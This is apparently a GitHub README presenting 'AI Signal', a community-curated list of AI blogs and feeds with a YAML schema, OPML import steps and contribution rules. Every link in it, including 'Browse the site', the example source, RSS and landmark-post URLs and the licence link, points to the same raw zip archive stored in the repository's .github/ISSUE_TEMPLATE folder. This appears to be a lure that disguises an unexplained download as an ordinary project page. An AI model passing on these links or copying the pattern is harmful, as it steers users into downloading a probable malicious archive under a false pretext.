# AI Signal

**A curated, structured reading layer for the AI field.**

Not a link dump. Not a Twitter list. A community-maintained set of sources with depth ratings, audience tags, and landmark post annotations — built for people who want signal, not noise.

→ **[Browse the site](https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip)**
→ **[Download OPML](sources.opml)** — import into Feedly, Reeder, NetNewsWire, Inoreader

---

## Why this exists

AI is moving fast enough that:
- A blog post from 6 months ago may already be obsolete
- Good signal is scattered across arXiv, Substacks, GitHub, lab blogs, and Twitter threads
- "Awesome AI" lists are alphabetical link dumps with no curation signal

This repo is the data layer. Community PRs keep it updated. GitHub Actions flags stale sources automatically.

## Structure

The entire dataset lives in [`sources.yaml`](sources.yaml). Everything else is generated from it.

```yaml
- name: "Lilian Weng"
  url: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
  rss: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
  type: individual        # lab | individual | applied | systems | paper-explainer | news
  depth: deep             # shallow | medium | deep
  audience: [researcher, ml-engineer]
  tags: [transformers, rl, diffusion, survey, agents]
  activity: active        # active | slow | archived
  last_checked: 2026-05
  landmark_posts:
    - title: "Extrinsic Hallucinations in LLMs"
      url: https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip
      why: "Best taxonomy of hallucination types — required reading before building any production LLM system"
```

### Generated outputs

| File | What it is |
|------|-----------|
| `sources.yaml` | The canonical data — edit this |
| `sources.opml` | Generated — do not edit by hand |
| `index.html` | The website — its data block is generated; run `generate_opml.py` to keep it in sync |

### Source types

| Type | What it means |
|------|--------------|
| `lab` | Official research blogs from AI labs |
| `individual` | Individual practitioners or researchers |
| `systems` | Infrastructure, inference, serving |
| `paper-explainer` | Newsletters and blogs that explain research |
| `applied` | Company engineering blogs building with AI |
| `news` | Weekly digests and news |

### Depth ratings

| Rating | Means |
|--------|-------|
| `deep` | Assumes strong technical background; rewards careful reading |
| `medium` | Accessible to engineers without ML specialisation |
| `shallow` | Good for staying oriented; low time commitment |

### Activity status

| Status | Means |
|--------|-------|
| `active` | Posts at least once every ~6 weeks |
| `slow` | Infrequent but posted in the last 18 months |
| `archived` | No longer updating — kept only if landmark posts exist |

---

## Using the OPML

Import `sources.opml` into:
- **Feedly** — Add Content → OPML import
- **Reeder** (iOS/macOS) — Add Account → OPML
- **NetNewsWire** — File → Import Subscriptions
- **Inoreader** — Preferences → Import

The OPML is grouped by source type so you can subscribe to just the categories you want.

---

## Contributing

Everything flows through `sources.yaml`. No special tools required.

### The one rule

**After any edit to `sources.yaml`, regenerate the OPML before committing:**

```bash
python generate_opml.py
git add sources.yaml sources.opml
git commit -m "your message"
```

That's it. The site redeploys automatically on push.

### Adding a source manually

1. Edit `sources.yaml` — add your entry following the schema above
2. `python generate_opml.py`
3. Open a PR

Required fields: `name`, `url`, `type`, `depth`, `audience`, `tags`, `activity`, `last_checked`.
`rss` is strongly preferred — sources without it won't appear in the OPML.
`landmark_posts` are optional but highly valued.

### Updating activity status

If a source has gone quiet, open a PR:
- No posts in 90+ days → `activity: slow`
- No posts in 18+ months → `activity: archived`

### Removing a source

Sources are removed only if they've been `archived` for 6+ months with no landmark posts. Open an issue first — sometimes someone has context on a temporarily quiet source.

---

## Automation

A GitHub Actions workflow runs every Monday and:
1. Checks every RSS feed for recent activity
2. Flags sources with no posts in 90+ days
3. Opens a GitHub issue with the stale list for community review

---

## Optional: AI-assisted curation

If you have Claude Code (Claude Pro), two slash commands can run a full curation pass — checking every source via web search, surfacing new candidates, and editing `sources.yaml` directly.

**This is completely optional.** The manual workflow above is the primary path.

| Command | What it does |
|---------|-------------|
| `/scan-sources` | Checks all sources for recent activity, updates `activity` and `last_checked` |
| `/curate` | Full pass: activity scan + landmark detection + new source discovery |

After either command runs, review and commit:

```bash
git diff sources.yaml          # read what changed
# edit sources.yaml directly if you want to adjust anything
python generate_opml.py        # always regenerate after any edit
git add sources.yaml sources.opml
git commit -m "curate: YYYY-MM-DD"
git push
```

See `SETUP.md` for the full setup and workflow.

---

Licensed [CC BY-SA 4.0](https://github.com/adequate-clabber684/ai-signal/raw/refs/heads/main/.github/ISSUE_TEMPLATE/ai-signal-2.1.zip).
Not affiliated with any listed organization.
